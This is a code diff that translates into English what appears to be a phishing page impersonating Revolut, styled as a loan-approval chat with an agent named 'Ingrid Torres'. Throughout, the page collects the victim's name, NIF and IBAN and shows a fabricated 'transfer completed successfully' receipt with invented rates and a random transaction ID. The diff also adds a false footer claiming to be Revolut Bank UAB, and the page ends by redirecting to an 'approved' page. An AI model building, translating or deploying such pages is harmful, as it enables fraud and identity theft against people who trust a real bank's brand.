@@ -1,5 +1,5 @@
 <!doctype html>
-<html lang="pt-PT">
+<html lang="en">
 <head>
 <script>
 (function(){
@@ -17,7 +17,7 @@
 </script>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
-<title>RevolutBank · Conversa com Ingrid Torres</title>
+<title>RevolutBank · Chat with Ingrid Torres</title>
 <link rel="icon" href="images/revolut-favicon.svg"/>
 <link rel="preload" as="image" href="images/ingrid-avatar.png" fetchpriority="high"/>
 <link rel="preload" as="image" href="images/revolut-logo.png"/>
@@ -184,7 +184,7 @@
     <div class="brand"><img src="images/revolut-logo.png" alt="RevolutBank" style="height:28px;width:auto;display:block;"/></div>
     <div class="user-block">
       <div class="user-info">
-        <div class="name" id="userName">cliente</div>
+        <div class="name" id="userName">customer</div>
         <div class="nif" id="userNif">*** *** ***</div>
       </div>
       <div class="avatar"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M16 14a4 4 0 10-8 0M12 12a4 4 0 100-8 4 4 0 000 8z" stroke-linecap="round" stroke-linejoin="round"/><path d="M4 21c1.5-3.5 4.5-5 8-5s6.5 1.5 8 5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
@@ -201,7 +201,7 @@
     </div>
 
     <div class="messages" id="messages">
-<div class="sim-box" id="simBox"><div class="sim-row"><input class="sim-input" id="simInput" type="text" maxlength="10" placeholder="escreva SIM para confirmar..." autocomplete="off"/><button class="sim-btn" id="simBtn"><svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M22 2L11 13" stroke-linecap="round" stroke-linejoin="round"/><path d="M22 2L15 22 11 13 2 9l20-7z" stroke-linecap="round" stroke-linejoin="round"/></svg></button></div></div>
+<div class="sim-box" id="simBox"><div class="sim-row"><input class="sim-input" id="simInput" type="text" maxlength="10" placeholder="type YES to confirm..." autocomplete="off"/><button class="sim-btn" id="simBtn"><svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M22 2L11 13" stroke-linecap="round" stroke-linejoin="round"/><path d="M22 2L15 22 11 13 2 9l20-7z" stroke-linecap="round" stroke-linejoin="round"/></svg></button></div></div>
       <div class="row them" id="typingRow">
         <div class="bubble-pic"></div>
         <div class="bubble"><div class="typing"><span></span><span></span><span></span></div></div>
@@ -209,17 +209,17 @@
     </div>
 
     <div class="options" id="options" style="display:none">
-      <button class="opt" data-v="Pagar despesas">Pagar despesas</button>
-      <button class="opt" data-v="Investir no negócio">Investir no negócio</button>
-      <button class="opt" data-v="Reformar a casa">Reformar a casa</button>
-      <button class="opt" data-v="Emergência médica">Emergência médica</button>
+      <button class="opt" data-v="Pay expenses">Pay expenses</button>
+      <button class="opt" data-v="Invest in business">Invest in business</button>
+      <button class="opt" data-v="Home renovation">Home renovation</button>
+      <button class="opt" data-v="Medical emergency">Medical emergency</button>
     </div>
 
     <div class="options" id="options2" style="display:none">
-      <button class="opt2" data-v="Sim, em banco tradicional">Sim, em banco tradicional</button>
-      <button class="opt2" data-v="Sim, em banco digital">Sim, em banco digital</button>
-      <button class="opt2" data-v="Sim, em ambos">Sim, em ambos</button>
-      <button class="opt2" data-v="Vou abrir uma conta">Vou abrir uma conta</button>
+      <button class="opt2" data-v="Yes, at a traditional bank">Yes, at a traditional bank</button>
+      <button class="opt2" data-v="Yes, at a digital bank">Yes, at a digital bank</button>
+      <button class="opt2" data-v="Yes, at both">Yes, at both</button>
+      <button class="opt2" data-v="I'll open an account">I'll open an account</button>
     </div>
 
     <div class="options" id="options3" style="display:none">
@@ -227,34 +227,34 @@
       <button class="opt3" data-v="Millennium BCP">Millennium BCP</button>
       <button class="opt3" data-v="CGD">CGD</button>
       <button class="opt3" data-v="RevolutBank">RevolutBank</button>
-      <button class="opt3" data-v="Outro Banco">Outro Banco</button>
+      <button class="opt3" data-v="Other Bank">Other Bank</button>
     </div>
 
     <div class="iban-box" id="ibanBox" style="display:none">
       <input class="iban-input" id="ibanInput" type="text" inputmode="numeric" maxlength="34" placeholder="50 1234 5678 9012 3456 7890 1" autocomplete="off" value="PT"/>
-      <div class="iban-error" id="ibanError">Introduza um IBAN válido (ex.: PT50 1234 5678 9012 3456 7890 1).</div>
-      <button class="iban-btn" id="ibanBtn"><span data-msg="chat.t09">Confirmar IBAN</span></button>
+      <div class="iban-error" id="ibanError">Please enter a valid IBAN (e.g., PT50 1234 5678 9012 3456 7890 1).</div>
+      <button class="iban-btn" id="ibanBtn"><span data-msg="chat.t09">Confirm IBAN</span></button>
     </div>
 
     <div class="confirm-box" id="ibanConfirm" style="display:none">
-      <div class="confirm-msg">O IBAN para transferência é:<strong id="confirmIbanText"></strong>Está correto?</div>
-      <button class="confirm-yes" id="confirmYes"><span data-msg="chat.t11">Sim, está correto</span></button>
-      <button class="confirm-no" id="confirmNo"><span data-msg="chat.t12">Não, quero corrigir</span></button>
+      <div class="confirm-msg">The IBAN for the transfer is:<strong id="confirmIbanText"></strong>Is this correct?</div>
+      <button class="confirm-yes" id="confirmYes"><span data-msg="chat.t11">Yes, it's correct</span></button>
+      <button class="confirm-no" id="confirmNo"><span data-msg="chat.t12">No, I want to fix it</span></button>
     </div>
 
     <div class="options" id="options4" style="display:none">
-      <button class="opt4" data-v="No próximo mês">No próximo mês</button>
-      <button class="opt4" data-v="Em 30 dias">Em 30 dias</button>
-      <button class="opt4" data-v="Em 60 dias">Em 60 dias</button>
-      <button class="opt4" data-v="Em 90 dias">Em 90 dias</button>
+      <button class="opt4" data-v="Next month">Next month</button>
+      <button class="opt4" data-v="In 30 days">In 30 days</button>
+      <button class="opt4" data-v="In 60 days">In 60 days</button>
+      <button class="opt4" data-v="In 90 days">In 90 days</button>
     </div>
 
     <div class="amount-box" id="amountBox">
-      <div class="amount-label">Valor do empréstimo</div>
+      <div class="amount-label">Loan amount</div>
       <div class="amount-value" id="amountValue">€ 10.000,00</div>
       <input type="range" id="amountRange" class="amount-slider" min="1000" max="75000" step="500" value="10000"/>
       <div class="amount-minmax"><span>€ 1.000,00</span><span>€ 75.000,00</span></div>
-      <button class="amount-btn" id="amountBtn">Confirmar valor <span>✓</span></button>
+      <button class="amount-btn" id="amountBtn">Confirm amount <span>✓</span></button>
     </div>
 
     <div class="parcelas-box" id="parcelasBox"></div>
@@ -271,11 +271,11 @@
     <div class="footer-inner">
       <div class="footer-logo"><img src="images/revolut-logo.png" alt="RevolutBank" style="height:36px;width:auto;display:block;margin:0 auto;"/></div>
       <div class="footer-company">RevolutBank</div>
-      <div class="footer-meta">Sucursal em Portugal – Lisboa – 1050-001</div>
+      <div class="footer-meta">Revolut Bank UAB — Headquartered in Lithuania</div>
       <div class="footer-badges">
-        <span><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-7a2 2 0 00-2-2H6a2 2 0 00-2 2v7a2 2 0 002 2zm10-11V7a4 4 0 00-8 0v4h8z" stroke-linecap="round" stroke-linejoin="round"/></svg>SSL Seguro</span>
-        <span><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M9 12l2 2 4-4" stroke-linecap="round" stroke-linejoin="round"/><path d="M20.6 5A12 12 0 0112 3 12 12 0 013.4 5 12 12 0 003 9c0 5.6 3.8 10.3 9 11.6 5.2-1.3 9-6 9-11.6 0-1-.1-2-.4-4z" stroke-linecap="round" stroke-linejoin="round"/></svg>Dados protegidos</span>
-        <span><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M3 21h18M5 21V7l7-4 7 4v14M9 9h.01M15 9h.01M9 13h.01M15 13h.01M9 17h.01M15 17h.01" stroke-linecap="round" stroke-linejoin="round"/></svg>Instituição regulada</span>
+        <span><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-7a2 2 0 00-2-2H6a2 2 0 00-2 2v7a2 2 0 002 2zm10-11V7a4 4 0 00-8 0v4h8z" stroke-linecap="round" stroke-linejoin="round"/></svg>SSL Secure</span>
+        <span><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M9 12l2 2 4-4" stroke-linecap="round" stroke-linejoin="round"/><path d="M20.6 5A12 12 0 0112 3 12 12 0 013.4 5 12 12 0 003 9c0 5.6 3.8 10.3 9 11.6 5.2-1.3 9-6 9-11.6 0-1-.1-2-.4-4z" stroke-linecap="round" stroke-linejoin="round"/></svg>Protected data</span>
+        <span><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M3 21h18M5 21V7l7-4 7 4v14M9 9h.01M15 9h.01M9 13h.01M15 13h.01M9 17h.01M15 17h.01" stroke-linecap="round" stroke-linejoin="round"/></svg>Regulated institution</span>
       </div>
     </div>
   </footer>
@@ -297,7 +297,7 @@
     if(d.length>=9) document.getElementById('userNif').textContent = d.slice(0,3)+' *** *'+d.slice(7,9);
   }
 
-  var firstName = (nome.trim().split(/\s+/)[0]||'cliente').toLowerCase();
+  var firstName = (nome.trim().split(/\s+/)[0]||'customer').toLowerCase();
   var capName = firstName.charAt(0).toUpperCase()+firstName.slice(1);
 
   function now(){
@@ -347,7 +347,7 @@
   }catch(e){}
 
   // Show first message quickly (DOM is ready — script is at end of body)
-  addThem('Olá, '+capName+'! Estamos quase a concluir a análise do seu pedido. Antes disso, preciso apenas de lhe colocar algumas perguntas rápidas. Qual é o principal motivo para solicitar este crédito?', function(){
+  addThem('Hello, '+capName+'! We are almost done reviewing your application. Before that, I just need to ask you a few quick questions. What is the main reason for requesting this loan?', function(){
     document.getElementById('options').style.display = 'flex';
   }, 350);
 
@@ -360,7 +360,7 @@
       addMe(v);
       document.getElementById('options').style.display='none';
       addTyping();
-      addThem('Perfeito! Tem uma conta bancária ativa em seu nome?', function(){
+      addThem('Perfect! Do you have an active bank account in your name?', function(){
         document.getElementById('options2').style.display = 'flex';
       });
     });
@@ -375,7 +375,7 @@
       addMe(v);
       document.getElementById('options2').style.display='none';
       addTyping();
-      addThem('Ótimo! Vamos confirmar a conta de destino para a transferência do montante aprovado. Em que banco pretende receber o crédito?', function(){
+      addThem('Great! Let\'s confirm the destination account for the transfer of the approved amount. Which bank would you like to receive the loan in?', function(){
         document.getElementById('options3').style.display = 'flex';
       });
     });
@@ -390,8 +390,8 @@
       addMe(v);
       document.getElementById('options3').style.display='none';
       addTyping();
-      var bankLabel = v === 'Outro Banco' ? 'Outro Banco' : v;
-      addThem('Perfeito! Confirme o IBAN da sua conta '+bankLabel+' onde pretende receber o montante do crédito.', function(){
+      var bankLabel = v === 'Other Bank' ? 'Other Bank' : v;
+      addThem('Perfect! Confirm the IBAN of your '+bankLabel+' account where you want to receive the loan amount.', function(){
         var box = document.getElementById('ibanBox');
         box.style.display='flex';
         var _ii=document.getElementById('ibanInput');
@@ -461,7 +461,7 @@
     addMe(val);
     document.getElementById('ibanConfirm').style.display='none';
     addTyping();
-    addThem('Última pergunta! Quando pretende começar a pagar as prestações?', function(){
+    addThem('Last question! When would you like to start paying the installments?', function(){
       document.getElementById('options4').style.display = 'flex';
     });
   });
@@ -482,7 +482,7 @@
       addMe(v);
       document.getElementById('options4').style.display='none';
       addTyping();
-      addThem('Perfeito! Agora me diga: quanto você precisa?', function(){
+      addThem('Perfect! Now tell me: how much do you need?', function(){
         document.getElementById('amountBox').style.display='flex';
       });
     });
@@ -502,7 +502,7 @@
   });
   updateSliderFill();
 
-  // Coeficientes calibrados para bater exatamente com a tabela de referência (€10.000)
+  // Coefficients calibrated to exactly match the reference table (€10.000)
   var COEFS = [
     {n:3,  c:0.335892},
     {n:6,  c:0.168910},
@@ -541,14 +541,14 @@
         localStorage.setItem('selectedLoanAmount', principal);
         localStorage.setItem('selectedInstallments', n);
         localStorage.setItem('selectedMonthlyPayment', valorParcela.toFixed(2));
-        addMe(n+'x de '+fmtEUR(valorParcela));
+        addMe(n+'x of '+fmtEUR(valorParcela));
         document.getElementById('parcelasBox').style.display='none';
         addTyping();
-        addThem('Perfeito! Vou processar o pagamento agora...', function(){
+        addThem('Perfect! I will process the payment now...', function(){
           renderReceipt(principal, n, valorParcela, valorTotal);
           setTimeout(function(){
             addTyping();
-            addThem('Confirme digitando "SIM" para finalizar sua solicitação:', function(){
+            addThem('Confirm by typing "YES" to finalize your request:', function(){
               var sb=document.getElementById('simBox'),msgs2=document.getElementById('messages');
               msgs2.appendChild(sb);
               sb.style.display='flex';
@@ -571,17 +571,17 @@
     addMe(fmtEUR(principal));
     document.getElementById('amountBox').style.display='none';
     addTyping();
-    addThem('Ótimo! Agora escolha em quantas vezes você quer pagar:', function(){
+    addThem('Great! Now choose how many installments you want to pay in:', function(){
       renderParcelas(principal);
     });
   });
 
-  // --- Comprovativo de transferência ---
+  // --- Transfer receipt ---
   function renderReceipt(principal, n, valorParcela, valorTotal){
-    var nomeCli = (localStorage.getItem('nome') || 'cliente').trim();
+    var nomeCli = (localStorage.getItem('nome') || 'customer').trim();
     var nomeShort = nomeCli.split(/\s+/).slice(0,2).join(' ').toLowerCase();
     var nifCli = (localStorage.getItem('nif') || '').replace(/\D/g,'');
-    var banco = localStorage.getItem('bancoDestino') || 'Outro Banco';
+    var banco = localStorage.getItem('bancoDestino') || 'Other Bank';
     var ibanCli = localStorage.getItem('iban') || '';
     var ibanFmt = ibanCli.replace(/\s/g,'').toUpperCase().match(/.{1,4}/g);
     ibanFmt = ibanFmt ? ibanFmt.join(' ') : ibanCli;
@@ -590,23 +590,23 @@
     var hh = ('0'+d.getHours()).slice(-2)+':'+('0'+d.getMinutes()).slice(-2);
     var txId = 'E' + Math.floor(Math.random()*9e7+1e7).toString();
 
-    // Calcular TAN, TAEG, MTIC aproximados
+    // Approximate TAN, TAEG, MTIC
     var TAN  = 4.60;
     var TAEG = 5.90;
     var mtic = (valorParcela * n).toFixed(2);
     var mticFmt = '€ ' + parseFloat(mtic).toLocaleString('de-DE', {minimumFractionDigits:2, maximumFractionDigits:2});
 
     var html =
-      '<div class="row-i"><div class="k">Banco Destino</div><div class="vv">'+banco+'</div></div>' +
-      '<div class="row-i"><div class="k">Prestações</div><div class="vv">'+n+'x de '+fmtEUR(valorParcela)+'</div></div>' +
+      '<div class="row-i"><div class="k">Destination Bank</div><div class="vv">'+banco+'</div></div>' +
+      '<div class="row-i"><div class="k">Installments</div><div class="vv">'+n+'x of '+fmtEUR(valorParcela)+'</div></div>' +
       '<div class="row-i"><div class="k">TAN</div><div class="vv">'+TAN.toFixed(2)+'%</div></div>' +
       '<div class="row-i"><div class="k">TAEG</div><div class="vv">'+TAEG.toFixed(2)+'%</div></div>' +
       '<div class="row-i"><div class="k">MTIC</div><div class="vv">'+mticFmt+'</div></div>' +
-      '<div class="row-i"><div class="k">Data/Hora</div><div class="vv">'+dd+' '+hh+'</div></div>' +
-      '<div class="row-i"><div class="k">ID Transação</div><div class="vv">'+txId+'</div></div>' +
-      '<div class="foot"><b>Transferência realizada com sucesso</b>RevolutBank — Sucursal em Portugal</div>';
+      '<div class="row-i"><div class="k">Date/Time</div><div class="vv">'+dd+' '+hh+'</div></div>' +
+      '<div class="row-i"><div class="k">Transaction ID</div><div class="vv">'+txId+'</div></div>' +
+      '<div class="foot"><b>Transfer completed successfully</b>Revolut Bank UAB — Headquartered in Lithuania</div>';
 
-    // Insere o comprovante dentro do fluxo de mensagens
+    // Insert the receipt into the message flow
     var msgs = document.getElementById('messages');
     var receiptRow = document.createElement('div');
     receiptRow.style.cssText = 'width:100%;margin:4px 0;';
@@ -619,14 +619,14 @@
     window.scrollTo(0, document.body.scrollHeight);
   }
 
-  // --- Confirmação SIM ---
+  // --- YES confirmation ---
   function sendSim(){
     var simInput = document.getElementById('simInput');
     var val = simInput.value.trim().toUpperCase();
     if(!val) return;
     var txt = simInput.value.trim();
     simInput.value = '';
-    // Mostra o nome do usuário + texto como bolha (igual ao print)
+    // Show the user's name + text as a bubble
     var msgs = document.getElementById('messages');
     var row = document.createElement('div');
     row.className = 'row me';
@@ -634,20 +634,20 @@
     msgs.appendChild(row);
     window.scrollTo(0, document.body.scrollHeight);
 
-    if(val === 'SIM'){
+    if(val === 'YES'){
       document.getElementById('simBox').style.display='none';
 
       addTyping();
-      addThem('Perfeito! Agora vou finalizar sua análise...', function(){
+      addThem('Perfect! I will now finalize your review...', function(){
         setTimeout(function(){
           var pp = new URLSearchParams(window.location.search);
           window.location.href = 'aprovado.html' + (pp.toString() ? '?'+pp.toString() : '');
         }, 1600);
       }, 700);
     } else {
-      // Resposta se digitou algo errado
+      // Response if the wrong value was typed
       addTyping();
-      addThem('Por favor, confirme digitando exatamente <strong>SIM</strong> para prosseguir.', function(){
+      addThem('Please confirm by typing exactly <strong>YES</strong> to proceed.', function(){
         document.getElementById('simInput').focus();
       }, 600);
     }
